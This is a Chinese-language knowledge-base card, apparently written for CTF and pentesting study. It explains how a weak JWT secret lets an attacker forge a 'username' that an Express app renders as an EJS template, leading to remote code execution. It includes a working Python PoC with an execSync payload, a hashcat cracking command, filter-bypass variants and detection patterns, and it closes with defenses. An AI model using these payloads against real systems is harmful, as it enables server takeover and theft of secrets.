---
id: web-nodejs-ssti-jwt-weak-secret-ejs-username-rce
title: JWT 弱密钥伪造用户名触发 EJS 模板注入 RCE
type: scenario
domain: web
path: web/nodejs/ssti
technique: jwt-weak-secret-ejs-username-ssti
tags:
- nodejs
- express
- ejs
- ssti
- jwt
- weak-secret
- rce
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:34:35+08:00'
  notes: 已对照原文 code/exp 核对；EJS 渲染 JWT username + secret 弱密钥与原文一致；PoC 未复跑。
url: /docs/web/nodejs/ssti/web-nodejs-ssti-jwt-weak-secret-ejs-username-rce/
draft: false
kb_aliases:
- JWT 弱密钥 + EJS SSTI
- Express EJS 模板注入
- username 字段模板渲染
- jwt_cracker secret
- ejs.render 用户输入
---

## 一句话结论

Express 应用用弱密钥 `secret` 签发 HS256 JWT，且把 JWT 里的 `username` 直接交给 `ejs.render()` 当模板源码渲染；攻击者离线爆破/猜到密钥后伪造 `username` 为 EJS 表达式，即可在服务端执行任意命令并读取环境变量中的 flag。

## 原理

- Express 默认把模板引擎的渲染结果写回页面；本应用在 `/` 路由中执行 `ejs.render(String(currentUser.username), { user: currentUser, process })`，把令牌里的 `username` 当作模板字符串，而不是普通数据。
- EJS 的 `<%= expr %>` 会在服务端求值 `expr` 并输出结果，`<% code %>` 只执行不输出。提交 `<%= 7*7 %>` 返回 `49` 即可确认模板注入；提交 `<%= process.mainModule.require('child_process').execSync('id').toString() %>` 即可回显命令输出。
- `username` 来自 JWT 的 payload，服务端用 `jwt.verify(token, JWT_SECRET)` 验签。密钥若为 `secret`、`password` 等弱口令，可用一份合法 token 离线字典爆破（hashcat `-m 16500` 或 PyJWT 逐条尝试），命中后即可任意签发 `username`。
- 应用把 `process` 直接放进 EJS 的 locals，进一步降低了利用门槛：无需 `global.process` 或构造器逃逸，模板里可直接用 `process.mainModule.require` 取 `child_process`。
- 根因是“把用户可控字符串当模板源码”加上“JWT 弱密钥”；两者单独出现危害有限，组合后未认证攻击者可稳定 RCE。

## 触发条件

- 应用使用 HS256/HS384/HS512，密钥为弱口令、默认值或可从字典猜到的字符串。
- 攻击者能取得至少一个合法 JWT（注册/登录响应、Cookie、前端存储等）。
- 服务端把 JWT 中的某个字段拼接进模板并交给 EJS（或其他模板引擎）渲染，而不是作为 locals 数据。
- 渲染进程可使用 `process`/`require`/`child_process`，且结果可回显或有外带通道。

## 利用步骤

1. 注册一个用户，抓取响应中的 JWT 或 Cookie 里的 token。
2. 离线爆破密钥：`hashcat -a 0 -m 16500 jwt.txt rockyou.txt`，或用 PyJWT 遍历字典；本例命中 `secret`。
3. 用该密钥签发 token，把 `username` 设为探测表达式 `<%= 7*7 %>`，访问 `/`，确认页面回显 `49`。
4. 把 `username` 换成命令执行表达式：`<%= global.process.mainModule.require('child_process').execSync('env').toString() %>`，读取环境变量；或执行 `cat /flag`、反弹 shell。
5. 若应用过滤了 `process`/`require`，改用 `this.constructor.constructor('return process')()`、`global.process`、`process.mainModule` 等变体，或对关键字做字符串拼接。

## PoC

```python
import jwt, requests

secret = 'secret'  # 字典爆破命中
payload = {
    "email": "attacker@example.com",
    "username": "<%= global.process.mainModule.require('child_process').execSync('env').toString() %>",
}
token = jwt.encode(payload, secret, algorithm='HS256')
r = requests.get('http://target/', cookies={'token': token})
print(r.text)  # 页面中渲染出环境变量，含 flag
```

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

## 变体与关联

- 变体：EJS 分隔符换成 `<%- %>`（不转义输出）、`<% %>`（只执行）；模板字段换成 `email`、昵称、邀请码等任何被渲染的 JWT 字段。
- 变体：`process` 不在 locals 时，用 `global.process.mainModule.require`、`process.mainModule.require`、`this.constructor.constructor('return process')()` 取全局对象；`require` 不可用时用 `module.constructor._load`。
- 变体：弱密钥也可通过 `kid`/`jku` 注入、算法混淆（RS256→HS256）或 `alg:none` 绕过，见 JWT 相关卡片。
- 关联：[[web-nodejs-ssti-ejs-announcement-content-rce]]（EJS 内容字段 SSTI）、[[web-generic-jwt-weak-hmac-key-bruteforce]]（HS256 弱密钥爆破）、[[web-generic-jwt-alg-none-bypass]]（无密钥伪造）。
- 边界：密钥为强随机值、服务端不渲染 JWT 字段、EJS 使用 `escapeFunction`/沙箱或禁用 `process` 时，本链失效。

## 检测与防御

- JWT 密钥使用至少 256 位随机值（`crypto.randomBytes(32)`），按环境隔离并定期轮换；不要把密钥写进源码或示例配置。
- 不要把用户可控字段当模板源码；模板文件固定，用户数据只通过 locals 传入并按文本转义。禁止 `ejs.render(userInput)`/`ejs.compile(userInput)`。
- 渲染进程最小权限，避免把 `process` 放进模板 locals；禁用不需要的 `child_process` 和网络能力。
- 检测：JWT 的 `username` 等字段出现 `<%`、`%>`、`process`、`require`、`child_process`、`/dev/tcp/`；短时间大量 JWT 验签失败或同一账号 token 角色/字段突变；渲染进程派生 `bash`/`sh` 子进程。
- 响应：轮换 JWT 密钥、吊销会话，排查模板注入与命令执行痕迹。
